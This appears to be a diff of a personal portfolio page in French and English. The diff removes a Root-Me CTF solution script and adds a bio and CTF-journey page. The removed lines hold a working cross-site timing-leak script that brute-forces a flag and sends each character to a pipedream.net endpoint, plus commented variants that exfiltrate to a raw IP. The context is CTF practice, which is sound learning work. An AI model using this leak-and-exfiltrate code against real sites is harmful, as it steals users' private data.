@@ -1,109 +1,180 @@
-<!DOCTYPE html>
 <html lang="fr">
 
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- <link rel="stylesheet" href="../css/evil.css"> -->
-    <title>Symphony</title>
+    <title>KiraLY</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/w3.css">
+    <script src="../jsS/script.js" defer></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
 
 <body>
+    <ul id="nav_bar">
+        <li><a name="home" class="active" href="javascript:void(0);" onclick="showPage('home')">Home</a>
+        </li>
+        <li><a name="about" href="javascript:void(0);" onclick="showPage('about')">About
+                me</a></li>
 
-    </script>
-    <script defer="">
-        //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
-        //Tout les caractères pour trouver le flag
-        let alpha = `abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=`
-        //variable dans laqulle le flag sera stockée
-        let flag = ""
-        //L'endpoint dans lequel sera envoyé le flag
-        let endpoint = "https://eoba3aqmrw0ajf6.m.pipedream.net/?flag="
-        // let victime = "https://web-client-ch56.challenge01.root-me.org:58056/notes/392/"
-
-        /*
-        Fonction récursive permettant de leak le flag
-        */
-        function leak(url, i) {
-            // avec la balise object j'envoie une demande ressource avec la combinaison pour trouver le flag
-            let s = document.createElement('object')
-            //aw déja trouvé
-            s.data = `${url}${encodeURIComponent(flag)}${encodeURIComponent(alpha[i])}`
-
-            //création de la variable de calcule de temps
-            var start = performance.now()
-
-            //si la demande de ressource est sur le bon id le onload est trigger
-            s.onload = (e) => {
-                //on calcule le temps que la demande de ressource aura mis
-                var time = performance.now() - start;
-                console.log("The request took %d ms.", time);
-                //si le temps de la requête est surpérieur ou égale à 2 secondes
-                if (time >= 2000) {
-                    //On ajoute la lettre trrouvé au flag
-                    flag = flag + alpha[i]
-                    //ensuite on envoie la lettre à l'endpoint
-                    fetch(`${endpoint}${encodeURIComponent(flag)}`)
-                    //On recommence le processus si le caractère est trouvé
-                    leak(url, i)
-                } else if (i < alpha.length - 1) {
-                    //dans le cas contraire on passe au teste d'un autre caractère
-                    leak(url, i + 1)
-                }
-                e.target.remove()
-            }
-            document.body.appendChild(s)
-        }
-        //première éxecution de la fonction
-        leak("https://web-client-ch56.challenge01.root-me.org:58056/notes/1791/", 0)
+    </ul>
 
 
 
+    <!-- Contenu  -->
+    <div id="content">
+        <section id="home" class="page active">
+            <h1><b>Begin pwn ?</b>
+            </h1>
+            <div class="w3-container" style="margin: 50px;">
+                <!-- ressources -->
+                <h2>This section is going to contains some tips to initiate yourself into pwn</h2>
+                <img
+                    src="https://us.123rf.com/450wm/pablozz/pablozz2105/pablozz210500056/168899513-illustration-vectorielle-logo-ic%C3%B4ne-pour-les-travaux-industriels-de-construction-et-de.jpg?ver=6">
+            </div>
+        </section>
+        <section id="about" class="page">
+            <h1><b>About me</b>
+            </h1>
+            <div class="w3-container flex-container">
+                <img class="w3-circle" src="../auton672979.png" style="width:115px">
+                <div>
+                    <p><b>KiraLY</b>
+                    </p>
+
+                    <a class="link" href="https://www.root-me.org/KiraLY">
+                        <svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#"
+                            xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+                            xmlns:svg="http://www.w3.org/2000/svg"
+                            xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
+                            xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" viewBox="0 0 595.3 595.3"
+                            style="enable-background:new 0 0 595.3 595.3" id="svg72" sodipodi:docname="logo_rm_noir.svg"
+                            inkscape:version="0.92.2 2405546, 2018-03-11" width="25" height="25">
+                            <defs id="defs76"></defs>
+                            <g fill="currentcolor" id="g13"
+                                transform="matrix(1.8928864,0,0,1.8928864,-264.72593,-165.92773)">
+                                <path inkscape:connector-curvature="0" id="path5"
+                                    d="m299.2 319.9s0 0 0 0c-.1-.1-.2-.2-.2-.3-.1-.1-.1-.1-.2-.2-.1.0-.1-.1-.2-.1-.1-.1-.2-.1-.3-.2-.1.0-.2-.1-.3-.1s-.2-.1-.2-.1c-.1.0-.2.0-.3-.1-.1.0-.2.0-.3.0s-.2.0-.3.0-.2.0-.3.0-.2.0-.3.0-.2.0-.3.1c-.1.0-.2.1-.2.1-.1.0-.2.1-.3.1s-.2.1-.3.2c-.1.0-.1.1-.2.1-.1.1-.1.1-.2.2-.1.1-.2.2-.2.2s0 0 0 0l-8.1 10.1c-1 1.3-.8 3.1.5 4.1.5.4 1.2.6 1.8.6.9.0 1.7-.4 2.3-1.1l.1-.1c3-3.7 8.6-3.7 11.5.0l.1.1c.6.7 1.4 1.1 2.3 1.1.6.0 1.3-.2 1.8-.6 1.3-1 1.5-2.9.5-4.1z">
+                                </path>
+                                <path inkscape:connector-curvature="0" id="path7"
+                                    d="m285.7 149.1c-4.1.0-7.5 3.2-7.7 7.3l-15.3 5.6c-.8.3-1.4 1-1.4 1.9v9.7H249c-.9-3.3-3.8-5.7-7.4-5.7-4.2.0-7.7 3.4-7.7 7.7.0 4.2 3.4 7.7 7.7 7.7 3.6.0 6.5-2.4 7.4-5.7h14.3c1.1.0 2-.9 2-2v-10.3l13.5-5c1.3 2.5 3.9 4.2 6.8 4.2 4.2.0 7.7-3.4 7.7-7.7.1-4.2-3.4-7.7-7.6-7.7z">
+                                </path>
+                                <path inkscape:connector-curvature="0" id="path9"
+                                    d="m269.5 292.3c-2.5-.9-4.9-1.8-7.2-2.8-1.7-.8-3.4-1.6-5-2.4 3.8 3.8 13 10.6 22.9 10.8.6-.7 1.1-1.4 1.5-2.3-1.5-.3-3-.6-4.5-1-2.7-.7-5.2-1.4-7.7-2.3z"
+                                    class="st0"></path>
+                                <path inkscape:connector-curvature="0" id="path11"
+                                    d="m395 222.5c0-4.7-.3-9.4-1-13.9.0-.3-.1-.6-.1-.9-6.1-39.7-36.2-72.3-75.8-81-1-4.5-5-7.9-9.8-7.9-5.6.0-10.1 4.5-10.1 10.1.0 4.8 3.4 8.8 7.9 9.8v36.9c0 .6.3 1.2.8 1.6.3.2.7.3 1.1.3.2.0.5.0.7-.1l14.8-5.6c1 1.5 2.5 2.5 4.3 3v17.4c-7.5 9.2-16.8 17.5-26.7 24.9l-11.3-26.2c2.1-1.4 3.5-3.7 3.5-6.4.0-4.2-3.4-7.7-7.7-7.7-4.2.0-7.7 3.4-7.7 7.7.0 4.2 3.4 7.7 7.7 7.7.1.0.3.0.4.0l11.8 27.3c-6.9 5-14 9.5-21 13.6L243.2 223c-.4-.1-.8-.1-1.2.1l-10 3.9c-1.4-1.9-3.6-3.1-6.2-3.1-4.2.0-7.7 3.4-7.7 7.7.0 4.2 3.4 7.7 7.7 7.7 4.2.0 7.7-3.4 7.7-7.7.0-.3-.1-.6-.1-.9l9.4-3.7 29.3 8.8c-25 14-47.4 22.1-51.1 23.4l-1.8.6c-1.6-1.2-3.6-1.9-5.8-1.9-.1.0-.2.0-.3.0-4.7-11.1-7.1-23.2-7.1-35.3.0-6 .6-11.9 1.7-17.6h43.9c.9 3.3 3.8 5.7 7.4 5.7 4.2.0 7.7-3.4 7.7-7.7.0-4.2-3.4-7.7-7.7-7.7-3.6.0-6.5 2.4-7.4 5.7h-43c8.1-32.9 34.1-59.2 67.7-67 1.8 2.9 5 4.9 8.6 4.9 5.6.0 10.1-4.5 10.1-10.1s-4.5-10.1-10.1-10.1c-4.9.0-8.9 3.5-9.9 8-44.1 10-76.4 49.7-76.4 95.7.0 13.1 2.6 26.2 7.7 38.2-1.9 1.8-3 4.4-3 7.2.0 4.5 2.9 8.2 6.9 9.6v39.4c0 .7.2 1.4.6 2l2.2 1.5 29.9 21.1v25.2c0 2.1 1.7 3.8 3.8 3.8h1e2c2.1.0 3.8-1.7 3.8-3.8v-25.2l30-21.1 2.2-1.6c.4-.6.6-1.3.6-2V277c3.7-1.5 6.3-5.1 6.3-9.3.0-2.6-1-5-2.6-6.8 5.3-11.9 8-25.1 8-38.4zM281.4 125.6c.9-1 2.2-1.6 3.6-1.6 2.7.0 4.9 2.2 4.9 4.9.0 2.7-2.2 4.9-4.9 4.9-1 0-1.9-.3-2.7-.8-1.3-.9-2.2-2.4-2.2-4 0-1.4.5-2.6 1.3-3.4zm22 3.2c0-2.7 2.2-4.9 4.9-4.9 1.4.0 2.6.6 3.5 1.5.8.9 1.3 2 1.3 3.3.0 1.6-.8 3.1-2.1 4-.8.6-1.7.9-2.8.9-2.6.1-4.8-2.1-4.8-4.8zm18.8 38.5c0 .3.1.5.1.7l-12.2 4.6v-34c3-.5 5.5-2.3 6.9-4.8 10.7 2.4 20.7 6.7 29.6 12.6-.1 14.8-5.8 28.4-14.8 40.7v-12.4c3.3-.9 5.7-3.8 5.7-7.4.0-4.2-3.4-7.7-7.7-7.7-4.2.1-7.6 3.5-7.6 7.7zM213.5 272.7c-1.2.0-2.3-.5-3.2-1.2-1-.9-1.7-2.2-1.7-3.6.0-.6.1-1.2.3-1.7.7-1.8 2.5-3.1 4.5-3.1.9.0 1.7.3 2.4.7 1.4.8 2.4 2.4 2.4 4.2.0.9-.3 1.7-.7 2.4-.7 1.4-2.2 2.3-4 2.3zm170-1.9c-.9 1.1-2.3 1.9-3.8 1.9-1.4.0-2.6-.6-3.5-1.5-.8-.9-1.3-2-1.3-3.3.0-2.1 1.3-3.9 3.2-4.5.5-.2 1.1-.3 1.7-.3 2.3.0 4.3 1.7 4.8 3.9.1.3.1.6.1 1-.2 1-.6 2-1.2 2.8zm-3-13c-.3.0-.6.0-.9.0-5.6.0-10.1 4.5-10.1 10.1.0 4.3 2.7 8 6.6 9.4v36.8l-31.5 22.2c-1 .7-1.6 1.9-1.6 3.1v21.2c0 1.2-1 2.2-2.2 2.2h-11.7c-1.2.0-2.2-1-2.2-2.2V353c0-2-1.4-3.8-3.4-4-2.3-.2-4.2 1.6-4.2 3.8v7.9c0 1.2-1 2.2-2.2 2.2h-14.3c-1.2.0-2.2-1-2.2-2.2V349c0-2-1.4-3.8-3.4-4-2.3-.2-4.2 1.6-4.2 3.8v12c0 1.2-1 2.2-2.2 2.2h-14.3c-1.2.0-2.2-1-2.2-2.2V353c0-2-1.4-3.8-3.4-4-2.3-.2-4.2 1.6-4.2 3.8v7.9c0 1.2-1 2.2-2.2 2.2h-11.7c-1.2.0-2.2-1-2.2-2.2v-21.2c0-1.2-.6-2.4-1.6-3.1L217.6 314.2V277c3.5-1.6 5.9-5.1 5.9-9.2.0-.6-.1-1.2-.2-1.8 4-1.4 34.5-12.3 64.5-31 40.6-25.3 63.1-54 65.7-83.5 17.5 14.1 29.6 34.5 33.1 57.4-.5 50.1-87.8 81-88.7 81.3-.2.1-.7.2-1.1.4-1.1-.2-2.2-.4-3.4-.6-.8-.2-1.7-.3-2.5-.5-1.3-.2-2.6-.5-3.9-.8-.2-.1-.5-.1-.7-.1-.5-.1-1-.2-1.5-.3-.6-.1-1.2-.3-1.8-.4-1.4-.3-2.8-.6-4.1-1-2.5-.6-4.9-1.3-7.3-1.9-2.3-.7-4.7-1.3-6.9-2-.1.0-.1.0-.2.0-1.7-.5-3.3-1-4.9-1.6-.5-.2-1.1-.4-1.6-.5-.8-.3-1.5-.5-2.2-.7-1.3-.4-2.5-.8-3.6-1.3h-.1c-1.8-.6-3.4-1.2-4.8-1.8-1.5-.6-2.8-1.1-3.8-1.5-1-.5-1.9-.8-2.4-1.1-.6-.3-.9-.4-.9-.4s.2.3.6.7c.4.5 1 1.2 1.9 2 .8.8 1.9 1.8 3.2 2.8 1.3 1 2.8 2.1 4.4 3.2h.1c-.6 2-1 4.2-1 6.4.0 11.5 9.4 20.9 20.9 20.9 8.9.0 16.5-5.6 19.5-13.5 1 .1 2.1.2 3.1.3 1.8.1 3.5.1 5.1.1.1.0.2.1.3.1l16.9 17.2c4.3 4.3 11 5 16 1.7l26.4-14.8c2.3-1.5 3.8-4.1 3.8-6.9v-30.4c10.2-8.1 19.4-17.7 25.4-28.6-1.1 7.9-3.2 15.4-6.3 22.5zm-98.8 37.8c-.4.8-1 1.6-1.5 2.3v0c-2.4 2.8-6 4.6-10 4.6s-7.6-1.8-10-4.6c-2-2.3-3.1-5.3-3.1-8.5.0-.8.1-1.5.2-2.3 1.6.8 3.3 1.6 5 2.4 2.3 1 4.7 2 7.2 2.8 2.5.9 5.1 1.6 7.7 2.3 1.5.4 3 .7 4.5 1z">
+                                </path>
+                            </g>
+                        </svg>
+                    </a>
+                    <a class="link" href="https://github.com/Kira-vspec">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" width="25" height="25">
+                            <path fill="currentcolor"
+                                d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3 .3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5 .3-6.2 2.3zm44.2-1.7c-2.9 .7-4.9 2.6-4.6 4.9 .3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3 .7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3 .3 2.9 2.3 3.9 1.6 1 3.6 .7 4.3-.7 .7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3 .7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3 .7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <div class="w3-container" style="margin: 50px;">
+                <p>
+                    Hello, and welcome to my website!<br><br>
+                    I am 21 years old and I am a passionate IT professional
+                    specializing in systems and network security,<br> since
+                    my
+                    childhood, i have always loved playing around with my big brother's computer components with a big
+                    interest in the low level.<br>
+                    Now for skills improve purpose, i am doing some CTF in <b>Root-Me</b>, <b>pwn.college</b> and soon
+                    <b>Hack The Box.</b>
+                </p>
+            </div>
+
+            <div class="w3-container" style="margin: 50px;">
+                <h2><b>About my nickname</b></h2>
+                <p> Kiràly meaning <b>king</b> in Hungarian, I chose this nickname, because i love the Hungary country
+                    and
+                    also King alluded to absolute
+                    power,<br> a bit like the user <b>root</b> in Linux, that's why i put the hashtag with the crown in
+                    my
+                    profile picture.<br>
+                </p>
+
+            </div>
+
+            <div class="w3-container w3-mobile" style="margin: 100px;">
+                <h2><b>My Journey</b></h2>
+                <div class="timeline">
+                    <div class="container left">
+                        <div class="content">
+                            <h2>2023-2024</h2>
+                            <p>My journey continued with a where i graduated as the top student of the Bachelor's Degree
+                                in <b>Administration and Security of
+                                    Systems and Networks (Apprenticeship)</b> at <b>Université Sorbonne Paris Nord – IUT
+                                    de
+                                    Villetaneuse</b>.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="container right">
+                        <div class="content">
+                            <h2>2021-2023</h2>
+                            <p>After that i keeped on to BTS in <b>Digital Systems – Computing and Networks</b>, which i
+                                completed at <b>Lycée Maryse Condé</b>
+                                in Sarcelles.<br><br>
+
+                                During this program, i developed essential skills in network architecture, programming,
+                                and system administration, laying the groundwork for my expertise in cybersecurity and
+                                IT infrastructure. <br><br>Since 2023, i have been actively training on a Capture The
+                                Flag
+                                (CTF)
+                                platform, honing my skills in ethical hacking, cryptography, reverse engineering,
+                                forensics, and network security with
+                                <b>Root-Me :</b><br><br>
+                                <img
+                                    src="https://root-me-diff.vercel.app/rm-gh?nickname=KiraLY&gstats=show&style=midnight">
+                            </p>
+                        </div>
+                    </div>
+                    <div class="container left">
+                        <div class="content">
+                            <h2>2018-2021</h2>
+                            <p>My journey in IT and networking began with a Professional Baccalaureate in Digital
+                                Systems, which I completed at <b>Lycée Maryse Condé in Sarcelles</b>.<br><br>
+
+                                During this program, i gained fundamental knowledge in computer systems, electronics,
+                                and network administration, building a strong technical foundation that allowed me to
+                                pursue further studies in systems and network security.<br><br>
+
+                                This early experience gave me a hands-on approach to hardware, troubleshooting, and IT
+                                infrastructure, setting the stage for my specialization in network security and
+                                administration.</p>
+                        </div>
+                    </div>
+                    <div class="container right">
+                        <div class="content">
+                            <h2>A lifelong passion</h2>
+                            <p>I have always been passionate about technology and the digital world. From a young age, i
+                                was fascinated by how systems work, how networks connect us, and how security plays a
+                                crucial role in protecting information.<br><br>
+
+                                Beyond academics, i constantly train and challenge myself through Capture The Flag (CTF)
+                                platforms, where i develop my skills in ethical hacking, cryptography, and cybersecurity
+                                problem-solving.</p>
+                        </div>
+                    </div>
+                </div>
 
 
+            </div>
+        </section>
+    </div>
 
-        //Fonction permettant de brutforce l'id de la note de l'admin
-        
-        // const leak = async (url, id) => {
-        //     return new Promise((r) => {
-        //         let s = document.createElement('script')
-        //         s.src = url
-        //         s.onload = (e) => {
-        //             console.log('Onload event triggered at ' + url);
-        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
-        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${s.textContent}`)
-        //             e.target.remove()
-        //             return r(0)
-        //         }
-        //         s.onerror = (e) => {
-        //             console.log('Error event triggered');
-        //             fetch(`http://91.173.39.199:25565/?error=${id}`)
-        //             e.target.remove()
-        //             return r(1)
-        //         }
-        //         document.head.appendChild(s)
-        //     })
-        // }
-        // function probeError(url, id) {
-        //     let script = document.createElement('script');
-        //     script.src = url;
-        //     script.onload = () => {
-        //         console.log('Onload event triggered at ' + url);
-        //         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
-        //     }
-        //     script.onerror = () => {
-        //         console.log('Error event triggered');
-        //         fetch(`http://91.173.39.199:25565/?error=${id}`)
-        //     }
-        //     document.head.appendChild(script);
-        // }
-        // leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)
-
-
-    </script>
-    <h1 style="text-align: center;">-----------------------bienvenue----------------------</h1>
-    <input type="text" name="csrf" value="test">
+    <!-- Confort visuelle -->
+    <div class="w3-container">
+        <a href="javascript:void(0);" class="theme-toggle mode w3-button w3-xlarge w3-circle" onclick="toggleTheme()"><i
+                class="fa fa-moon-o" id="icon_dark" title="Dark/White mode"></i></a>
+    </div>
 </body>
 
 </html>
